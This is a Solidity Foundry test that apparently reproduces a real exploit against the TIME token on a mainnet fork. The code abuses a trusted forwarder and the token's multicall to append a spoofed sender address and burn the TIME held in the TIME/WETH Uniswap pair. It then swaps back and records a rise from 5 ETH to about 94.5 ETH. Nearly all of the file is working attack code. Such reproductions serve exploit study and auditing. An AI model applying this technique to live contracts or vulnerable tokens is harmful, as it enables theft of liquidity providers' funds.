// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

import "./ITime.sol";
import "./IForwarder.sol";

ITime constant TIME = ITime(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IUniswapV2Pair constant TIME_WETH = IUniswapV2Pair(
    0x760dc1E043D99394A10605B2FA08F123D60faF84
);
IUniswapV2Router constant PancakeV2Router = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);
IForwarder constant forwarder = IForwarder(
    0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81
);
address constant recoverAddr = 0xa16A5F37774309710711a8B4E83b068306b21724;

contract TimeTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 18730462);

        vm.label(address(TIME), "TIME");
        vm.label(address(WETH), "WETH");
        vm.label(address(TIME_WETH), "TIME_WETH");
        vm.label(address(PancakeV2Router), "PancakeV2Router");
        vm.label(address(forwarder), "Forwarder");
        vm.label(recoverAddr, "recoverAddr");

        deal(address(this), 5 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("ETH balance before attack", address(this).balance, 18);
        TIME.approve(address(PancakeV2Router), type(uint256).max);
        WETH.approve(address(PancakeV2Router), type(uint256).max);

        WETH.deposit{value: 5 ether}();
        // WETH -> TIME
        token2token(
            address(WETH),
            address(TIME),
            WETH.balanceOf(address(this))
        );

        // print("TIME balance", TIME.balanceOf(address(this)), 18);

        uint256 amountToBurn = 62_227_259_510 ether;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(
            TIME.burn.selector,
            amountToBurn,
            address(TIME_WETH)
        );

        bytes memory multicallData = abi.encodeWithSelector(
            TIME.multicall.selector,
            datas
        );

        vm.startPrank(address(forwarder));
        (bool success, bytes memory result) = address(TIME).call{
            gas: 5000000,
            value: 0
        }(multicallData);
        success;
        result;
        vm.stopPrank();

        TIME_WETH.sync();
        token2token(
            address(TIME),
            address(WETH),
            TIME.balanceOf(address(this))
        );
        WETH.withdraw(WETH.balanceOf(address(this)));

        // In the end of attack tx also ~5 ether was transferred to Flashbot
        print("ETH balance after attack", address(this).balance, 18);
        // ETH balance after attack: 94.513462587046838316
    }

    function token2token(
        address token1,
        address token2,
        uint256 amount
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
